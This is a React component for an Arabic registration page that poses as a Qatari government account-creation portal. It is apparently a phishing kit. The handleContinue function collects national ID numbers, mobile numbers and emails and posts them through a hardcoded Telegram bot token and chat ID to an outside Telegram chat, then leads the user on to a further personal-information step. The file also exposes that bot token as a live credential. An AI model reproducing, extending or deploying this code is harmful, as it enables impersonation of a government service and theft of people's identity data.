import { useState } from "react";
import { useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Info } from "lucide-react";
const AccountTypeForm = () => {
  const navigate = useNavigate();
  const [accountType, setAccountType] = useState<string>("");
  const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
  const [nationalId, setNationalId] = useState<string>("");
  const [mobileNumber, setMobileNumber] = useState<string>("");
  const [visitorEmail, setVisitorEmail] = useState<string>("");
  const [visitorEmailConfirm, setVisitorEmailConfirm] = useState<string>("");
  const [visitorMobile, setVisitorMobile] = useState<string>("");
  const [phoneCode, setPhoneCode] = useState<string>("");
  
  const handleRecaptchaChange = (value: string | null) => {
    setRecaptchaValue(value);
  };

  const sendToTelegram = async (message: string) => {
    try {
      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
      const chatId = "-4985537188";
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } catch (error) {
      console.error("فشل الإرسال إلى Telegram:", error);
    }
  };

  const isFormValid = () => {
    if (!accountType) return false;
    
    if (accountType === "citizens") {
      return nationalId.trim() !== "" && mobileNumber.trim() !== "" && recaptchaValue !== null;
    } else if (accountType === "visitors") {
      return visitorEmail.trim() !== "" && 
             visitorEmailConfirm.trim() !== "" && 
             visitorEmail === visitorEmailConfirm &&
             visitorMobile.trim() !== "" && 
             phoneCode !== "" && 
             recaptchaValue !== null;
    }
    
    return false;
  };

  const handleContinue = async () => {
    if (!isFormValid()) {
      alert("يرجى إكمال جميع الحقول المطلوبة بشكل صحيح");
      return;
    }

    if (accountType === "citizens") {
      const message = `تسجيل - نوع الحساب\n\nرقم البطاقة الشخصية: ${nationalId}\nرقم الهاتف المحمول: ${mobileNumber}`;
      await sendToTelegram(message);
    } else if (accountType === "visitors") {
      const message = `تسجيل - نوع الحساب (زائر)\n\nالبريد الإلكتروني: ${visitorEmail}\nرقم الهاتف: ${phoneCode} ${visitorMobile}`;
      await sendToTelegram(message);
    }
    navigate("/personal-info");
  };
  return <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
      <h2 className="text-2xl font-semibold mb-2 text-right">اختر نوع الحساب</h2>
      
      <div className="mb-8 flex items-start gap-2 text-sm text-primary">
        <Info className="w-5 h-5 mt-0.5 flex-shrink-0" />
        <span className="text-right">نوع الحساب</span>
      </div>

      <div className="mb-8">
        <RadioGroup value={accountType} onValueChange={setAccountType} className="space-y-3">
          <div className="flex items-center gap-3">
            <Label htmlFor="citizens" className="text-base cursor-pointer flex-1 text-right">
              المواطنين القطريين والمقيمين
            </Label>
            <RadioGroupItem value="citizens" id="citizens" />
          </div>

          <div className="flex items-center gap-3">
            <Label htmlFor="visitors" className="text-base cursor-pointer flex-1 text-right">
              الزوار والمستخدمين من خارج دولة قطر
            </Label>
            <RadioGroupItem value="visitors" id="visitors" />
          </div>
        </RadioGroup>
      </div>

      {accountType === "citizens" && <div className="space-y-6 mb-8">
          <div className="text-right mb-6">
            <p className="font-bold leading-relaxed" style={{
          color: '#a94a4c'
        }}>
              <span className="block mb-1">إرشاد</span>
              إذا كان رقم الهاتف المحمول لا يخضع لملكيتك، فسيتم إنشاء حسابك ولكن سيكون غير مفعل وعليك الاتصال بمركز الاتصال الحكومى لتفعيل حسابك.
            </p>
          </div>

          <div className="space-y-4">
            <div>
              <Label htmlFor="nationalId" className="text-right block mb-2">
                رقم البطاقة الشخصية
              </Label>
              <Input 
                id="nationalId" 
                type="text" 
                className="text-right bg-white"
                value={nationalId}
                onChange={(e) => setNationalId(e.target.value)}
              />
            </div>

            <div>
              <Label htmlFor="mobileNumber" className="text-right block mb-2">
                رقم الهاتف المحمول
              </Label>
              <Input 
                id="mobileNumber" 
                type="tel" 
                className="text-right bg-white"
                value={mobileNumber}
                onChange={(e) => setMobileNumber(e.target.value)}
              />
            </div>

            <div className="flex justify-start">
              <ReCAPTCHA sitekey="YOUR_RECAPTCHA_SITE_KEY" onChange={handleRecaptchaChange} />
            </div>
          </div>
        </div>}

      {accountType === "visitors" && <div className="space-y-6 mb-8">
          <div>
            <Label htmlFor="email" className="text-right block mb-2">
              البريد الإلكتروني
            </Label>
            <Input 
              id="email" 
              type="email" 
              className="text-right bg-white" 
              value={visitorEmail}
              onChange={(e) => setVisitorEmail(e.target.value)}
            />
          </div>

          <div>
            <Label htmlFor="confirmEmail" className="text-right block mb-2">
              أعد إدخال البريد الإلكتروني
            </Label>
            <Input 
              id="confirmEmail" 
              type="email" 
              className="text-right bg-white" 
              value={visitorEmailConfirm}
              onChange={(e) => setVisitorEmailConfirm(e.target.value)}
            />
            {visitorEmailConfirm && visitorEmail !== visitorEmailConfirm && (
              <p className="text-destructive text-xs mt-1 text-right">البريد الإلكتروني غير متطابق</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label htmlFor="visitorMobile" className="text-right block mb-2">
                رقم الهاتف المحمول
              </Label>
              <Input 
                id="visitorMobile" 
                type="tel" 
                className="text-right bg-white" 
                value={visitorMobile}
                onChange={(e) => setVisitorMobile(e.target.value)}
              />
            </div>

            <div>
              <Label htmlFor="phoneCode" className="text-right block mb-2">
                حدد الرمز الهاتف الدولي
              </Label>
              <Select value={phoneCode} onValueChange={setPhoneCode}>
                <SelectTrigger className="bg-white">
                  <SelectValue placeholder="حدد الرمز الهاتف الدولي" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="+93">+93 (أفغانستان)</SelectItem>
                  <SelectItem value="+355">+355 (ألبانيا)</SelectItem>
                  <SelectItem value="+213">+213 (الجزائر)</SelectItem>
                  <SelectItem value="+376">+376 (أندورا)</SelectItem>
                  <SelectItem value="+244">+244 (أنغولا)</SelectItem>
                  <SelectItem value="+54">+54 (الأرجنتين)</SelectItem>
                  <SelectItem value="+374">+374 (أرمينيا)</SelectItem>
                  <SelectItem value="+61">+61 (أستراليا)</SelectItem>
                  <SelectItem value="+43">+43 (النمسا)</SelectItem>
                  <SelectItem value="+994">+994 (أذربيجان)</SelectItem>
                  <SelectItem value="+973">+973 (البحرين)</SelectItem>
                  <SelectItem value="+880">+880 (بنغلاديش)</SelectItem>
                  <SelectItem value="+375">+375 (بيلاروسيا)</SelectItem>
                  <SelectItem value="+32">+32 (بلجيكا)</SelectItem>
                  <SelectItem value="+501">+501 (بليز)</SelectItem>
                  <SelectItem value="+229">+229 (بنين)</SelectItem>
                  <SelectItem value="+975">+975 (بوتان)</SelectItem>
                  <SelectItem value="+591">+591 (بوليفيا)</SelectItem>
                  <SelectItem value="+387">+387 (البوسنة والهرسك)</SelectItem>
                  <SelectItem value="+267">+267 (بوتسوانا)</SelectItem>
                  <SelectItem value="+55">+55 (البرازيل)</SelectItem>
                  <SelectItem value="+673">+673 (بروناي)</SelectItem>
                  <SelectItem value="+359">+359 (بلغاريا)</SelectItem>
                  <SelectItem value="+226">+226 (بوركينا فاسو)</SelectItem>
                  <SelectItem value="+257">+257 (بوروندي)</SelectItem>
                  <SelectItem value="+855">+855 (كمبوديا)</SelectItem>
                  <SelectItem value="+237">+237 (الكاميرون)</SelectItem>
                  <SelectItem value="+1">+1 (كندا)</SelectItem>
                  <SelectItem value="+56">+56 (تشيلي)</SelectItem>
                  <SelectItem value="+86">+86 (الصين)</SelectItem>
                  <SelectItem value="+57">+57 (كولومبيا)</SelectItem>
                  <SelectItem value="+506">+506 (كوستاريكا)</SelectItem>
                  <SelectItem value="+385">+385 (كرواتيا)</SelectItem>
                  <SelectItem value="+53">+53 (كوبا)</SelectItem>
                  <SelectItem value="+357">+357 (قبرص)</SelectItem>
                  <SelectItem value="+420">+420 (التشيك)</SelectItem>
                  <SelectItem value="+45">+45 (الدنمارك)</SelectItem>
                  <SelectItem value="+253">+253 (جيبوتي)</SelectItem>
                  <SelectItem value="+593">+593 (الإكوادور)</SelectItem>
                  <SelectItem value="+20">+20 (مصر)</SelectItem>
                  <SelectItem value="+503">+503 (السلفادور)</SelectItem>
                  <SelectItem value="+372">+372 (إستونيا)</SelectItem>
                  <SelectItem value="+251">+251 (إثيوبيا)</SelectItem>
                  <SelectItem value="+358">+358 (فنلندا)</SelectItem>
                  <SelectItem value="+33">+33 (فرنسا)</SelectItem>
                  <SelectItem value="+995">+995 (جورجيا)</SelectItem>
                  <SelectItem value="+49">+49 (ألمانيا)</SelectItem>
                  <SelectItem value="+233">+233 (غانا)</SelectItem>
                  <SelectItem value="+30">+30 (اليونان)</SelectItem>
                  <SelectItem value="+502">+502 (غواتيمالا)</SelectItem>
                  <SelectItem value="+224">+224 (غينيا)</SelectItem>
                  <SelectItem value="+509">+509 (هايتي)</SelectItem>
                  <SelectItem value="+504">+504 (هندوراس)</SelectItem>
                  <SelectItem value="+852">+852 (هونغ كونغ)</SelectItem>
                  <SelectItem value="+36">+36 (المجر)</SelectItem>
                  <SelectItem value="+354">+354 (آيسلندا)</SelectItem>
                  <SelectItem value="+91">+91 (الهند)</SelectItem>
                  <SelectItem value="+62">+62 (إندونيسيا)</SelectItem>
                  <SelectItem value="+98">+98 (إيران)</SelectItem>
                  <SelectItem value="+964">+964 (العراق)</SelectItem>
                  <SelectItem value="+353">+353 (أيرلندا)</SelectItem>
                  <SelectItem value="+972">+972 (إسرائيل)</SelectItem>
                  <SelectItem value="+39">+39 (إيطاليا)</SelectItem>
                  <SelectItem value="+81">+81 (اليابان)</SelectItem>
                  <SelectItem value="+962">+962 (الأردن)</SelectItem>
                  <SelectItem value="+7">+7 (كازاخستان)</SelectItem>
                  <SelectItem value="+254">+254 (كينيا)</SelectItem>
                  <SelectItem value="+965">+965 (الكويت)</SelectItem>
                  <SelectItem value="+996">+996 (قيرغيزستان)</SelectItem>
                  <SelectItem value="+856">+856 (لاوس)</SelectItem>
                  <SelectItem value="+371">+371 (لاتفيا)</SelectItem>
                  <SelectItem value="+961">+961 (لبنان)</SelectItem>
                  <SelectItem value="+218">+218 (ليبيا)</SelectItem>
                  <SelectItem value="+370">+370 (ليتوانيا)</SelectItem>
                  <SelectItem value="+352">+352 (لوكسمبورغ)</SelectItem>
                  <SelectItem value="+60">+60 (ماليزيا)</SelectItem>
                  <SelectItem value="+960">+960 (المالديف)</SelectItem>
                  <SelectItem value="+223">+223 (مالي)</SelectItem>
                  <SelectItem value="+356">+356 (مالطا)</SelectItem>
                  <SelectItem value="+222">+222 (موريتانيا)</SelectItem>
                  <SelectItem value="+230">+230 (موريشيوس)</SelectItem>
                  <SelectItem value="+52">+52 (المكسيك)</SelectItem>
                  <SelectItem value="+373">+373 (مولدوفا)</SelectItem>
                  <SelectItem value="+377">+377 (موناكو)</SelectItem>
                  <SelectItem value="+976">+976 (منغوليا)</SelectItem>
                  <SelectItem value="+382">+382 (الجبل الأسود)</SelectItem>
                  <SelectItem value="+212">+212 (المغرب)</SelectItem>
                  <SelectItem value="+258">+258 (موزمبيق)</SelectItem>
                  <SelectItem value="+95">+95 (ميانمار)</SelectItem>
                  <SelectItem value="+264">+264 (ناميبيا)</SelectItem>
                  <SelectItem value="+977">+977 (نيبال)</SelectItem>
                  <SelectItem value="+31">+31 (هولندا)</SelectItem>
                  <SelectItem value="+64">+64 (نيوزيلندا)</SelectItem>
                  <SelectItem value="+505">+505 (نيكاراغوا)</SelectItem>
                  <SelectItem value="+227">+227 (النيجر)</SelectItem>
                  <SelectItem value="+234">+234 (نيجيريا)</SelectItem>
                  <SelectItem value="+850">+850 (كوريا الشمالية)</SelectItem>
                  <SelectItem value="+47">+47 (النرويج)</SelectItem>
                  <SelectItem value="+968">+968 (عمان)</SelectItem>
                  <SelectItem value="+92">+92 (باكستان)</SelectItem>
                  <SelectItem value="+970">+970 (فلسطين)</SelectItem>
                  <SelectItem value="+507">+507 (بنما)</SelectItem>
                  <SelectItem value="+595">+595 (باراغواي)</SelectItem>
                  <SelectItem value="+51">+51 (بيرو)</SelectItem>
                  <SelectItem value="+63">+63 (الفلبين)</SelectItem>
                  <SelectItem value="+48">+48 (بولندا)</SelectItem>
                  <SelectItem value="+351">+351 (البرتغال)</SelectItem>
                  <SelectItem value="+974">+974 (قطر)</SelectItem>
                  <SelectItem value="+40">+40 (رومانيا)</SelectItem>
                  <SelectItem value="+7">+7 (روسيا)</SelectItem>
                  <SelectItem value="+250">+250 (رواندا)</SelectItem>
                  <SelectItem value="+966">+966 (السعودية)</SelectItem>
                  <SelectItem value="+221">+221 (السنغال)</SelectItem>
                  <SelectItem value="+381">+381 (صربيا)</SelectItem>
                  <SelectItem value="+65">+65 (سنغافورة)</SelectItem>
                  <SelectItem value="+421">+421 (سلوفاكيا)</SelectItem>
                  <SelectItem value="+386">+386 (سلوفينيا)</SelectItem>
                  <SelectItem value="+252">+252 (الصومال)</SelectItem>
                  <SelectItem value="+27">+27 (جنوب أفريقيا)</SelectItem>
                  <SelectItem value="+82">+82 (كوريا الجنوبية)</SelectItem>
                  <SelectItem value="+211">+211 (جنوب السودان)</SelectItem>
                  <SelectItem value="+34">+34 (إسبانيا)</SelectItem>
                  <SelectItem value="+94">+94 (سريلانكا)</SelectItem>
                  <SelectItem value="+249">+249 (السودان)</SelectItem>
                  <SelectItem value="+46">+46 (السويد)</SelectItem>
                  <SelectItem value="+41">+41 (سويسرا)</SelectItem>
                  <SelectItem value="+963">+963 (سوريا)</SelectItem>
                  <SelectItem value="+886">+886 (تايوان)</SelectItem>
                  <SelectItem value="+992">+992 (طاجيكستان)</SelectItem>
                  <SelectItem value="+255">+255 (تنزانيا)</SelectItem>
                  <SelectItem value="+66">+66 (تايلاند)</SelectItem>
                  <SelectItem value="+228">+228 (توغو)</SelectItem>
                  <SelectItem value="+216">+216 (تونس)</SelectItem>
                  <SelectItem value="+90">+90 (تركيا)</SelectItem>
                  <SelectItem value="+993">+993 (تركمانستان)</SelectItem>
                  <SelectItem value="+256">+256 (أوغندا)</SelectItem>
                  <SelectItem value="+380">+380 (أوكرانيا)</SelectItem>
                  <SelectItem value="+971">+971 (الإمارات)</SelectItem>
                  <SelectItem value="+44">+44 (المملكة المتحدة)</SelectItem>
                  <SelectItem value="+1">+1 (الولايات المتحدة)</SelectItem>
                  <SelectItem value="+598">+598 (أوروغواي)</SelectItem>
                  <SelectItem value="+998">+998 (أوزبكستان)</SelectItem>
                  <SelectItem value="+58">+58 (فنزويلا)</SelectItem>
                  <SelectItem value="+84">+84 (فيتنام)</SelectItem>
                  <SelectItem value="+967">+967 (اليمن)</SelectItem>
                  <SelectItem value="+260">+260 (زامبيا)</SelectItem>
                  <SelectItem value="+263">+263 (زيمبابوي)</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          

          <div className="flex justify-start">
            <ReCAPTCHA sitekey="YOUR_RECAPTCHA_SITE_KEY" onChange={handleRecaptchaChange} />
          </div>
        </div>}

      <div className="flex items-center justify-between gap-4 pt-6 border-t border-border">
        <div className="flex gap-3">
          <Button variant="outline" className="min-w-24">
            رجوع
          </Button>
          <Button variant="outline" className="min-w-24">
            إلغاء
          </Button>
        </div>
        
        <Button 
          className="min-w-32 bg-primary hover:bg-primary/90" 
          onClick={handleContinue}
          disabled={!isFormValid()}
        >
          استمر
        </Button>
      </div>
    </div>;
};
export default AccountTypeForm;